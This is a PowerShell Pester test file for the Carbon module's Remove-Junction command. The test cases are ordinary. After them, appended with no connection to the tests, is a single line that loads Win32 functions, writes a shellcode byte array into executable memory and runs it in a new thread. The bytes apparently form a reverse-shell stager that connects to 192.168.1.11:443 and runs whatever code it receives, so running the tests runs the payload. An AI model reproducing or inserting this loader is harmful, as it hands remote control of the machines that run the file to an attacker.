












& (Join-Path -Path $PSScriptRoot 'Initialize-CarbonTest.ps1' -Resolve)

Describe 'Remove-Junction' {
    
    $JunctionPath = $null
    $tempDir = Get-Item -Path 'TestDrive:'
    
    function Invoke-RemoveJunction($junction)
    {
        Remove-Junction $junction
    }
    
    BeforeEach {
        $Global:Error.Clear()
        $JunctionPath = Join-Path $tempDir ([IO.Path]::GetRandomFileName())
        New-Junction $JunctionPath $PSScriptRoot
    }
    
    AfterEach {
        if( Test-Path $JunctionPath -PathType Container )
        {
            cmd /c rmdir $JunctionPath
        }
        Get-ChildItem -Path $tempDir -Directory |
            Where-Object { $_.IsJunction } |
            ForEach-Object { Remove-Junction -LiteralPath $_.FullName }
        Remove-Item -Path $tempDir -Recurse
    }
    
    It 'should remove junction' {
        Invoke-RemoveJunction $JunctionPath
        $JunctionPath | Should Not Exist
        $PSScriptRoot | Should Exist
    }
    
    It 'should fail if junction actually a directory' {
        $realDir = Join-Path $env:Temp ([IO.Path]::GetRandomFileName())
        New-Item $realDir -ItemType 'Directory'
        $error.Clear()
        Invoke-RemoveJunction $realDir 2> $null
        $Global:Error.Count | Should BeGreaterThan 0
        $Global:Error[0] | Should Match 'is a directory'
        $realDir | Should Exist
        Remove-Item $realDir
    }
    
    It 'should do nothing if junction actually a file' {
        $path = [IO.Path]::GetTempFileName()
        $error.Clear()
        Invoke-RemoveJunction $path 2> $null
        $Global:Error.Count | Should BeGreaterThan 0
        $Global:Error[0] | Should Match 'is a file'
        $path | Should Exist
        Remove-Item $path
    }
    
    It 'should support what if' {
        Remove-Junction -Path $JunctionPath -WhatIf
        $JunctionPath | Should Exist
        (Join-Path $JunctionPath (Split-Path -Path $PSCommandPath -Leaf)) | Should Exist
        $PSScriptRoot | Should Exist
    }
    
    It 'should remove junction with relative path' {
        $parentDir = Split-Path -Parent -Path $JunctionPath
        $junctionName = Split-Path -Leaf -Path $JunctionPath
        Push-Location $parentDir
        try
        {
            Remove-Junction -Path ".\$junctionName"
            $JunctionPath | Should Not Exist
            $PSScriptRoot | Should Exist
        }
        finally
        {
            Pop-Location
        }
    }

    It 'should remove junction with wildcard characters' {
        Remove-Junction -Path $junctionPath
        $junctionPath = Join-Path -Path $tempDir -ChildPath 'withspecialchars[]'
        Install-Junction -Link $junctionPath -Target $PSScriptRoot
        Remove-Junction -Path $junctionPath
    }
    
    It 'should remove multiple junctions with wildcards' {
        $filePath = Join-Path -Path $tempDir -ChildPath 'file'
        New-Item -Path $filePath -ItemType 'file'
        $dirPath = Join-Path -Path $tempDir -ChildPath 'dir'
        New-Item -Path $dirPath -ItemType 'directory'
        $secondJunction = Join-Path -Path $tempDir -ChildPath 'junction2' 
        Install-Junction -Link $secondJunction -Target $PSScriptRoot

        Remove-Junction -Path (Join-Path -Path $tempDir -ChildPath '*')
        Get-ChildItem -Path $tempDir | Measure-Object | Select-Object -ExpandProperty 'Count' | Should Be 2
        $filePath | Should Exist
        $dirPath | Should Exist
        $JunctionPath | Should Not Exist
        $secondJunction | Should not Exist
    }

    It 'should not give an error if no junctions and using a wildcard' {
        Remove-Junction -Path $JunctionPath

        $filePath = Join-Path -Path $tempDir -ChildPath 'file'
        New-Item -Path $filePath -ItemType 'file'
        $dirPath = Join-Path -Path $tempDir -ChildPath 'dir'
        New-Item -Path $dirPath -ItemType 'directory'

        Remove-Junction -Path (Join-Path -Path $tempDir -ChildPath '*')
        $Global:Error.Count | Should Be 0
        $filePath | Should Exist
        $dirPath | Should Exist
    }

    It 'should not give an error if nothing at all to delete' {
        Remove-Junction -Path $JunctionPath
        Get-ChildItem -Path $tempDir | Measure-Object | Select-Object -ExpandProperty 'Count' | Should Be 0
        Remove-Junction -Path (Join-Path -Path $tempDir -ChildPath '*')
        $Global:Error.Count | Should Be 0
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

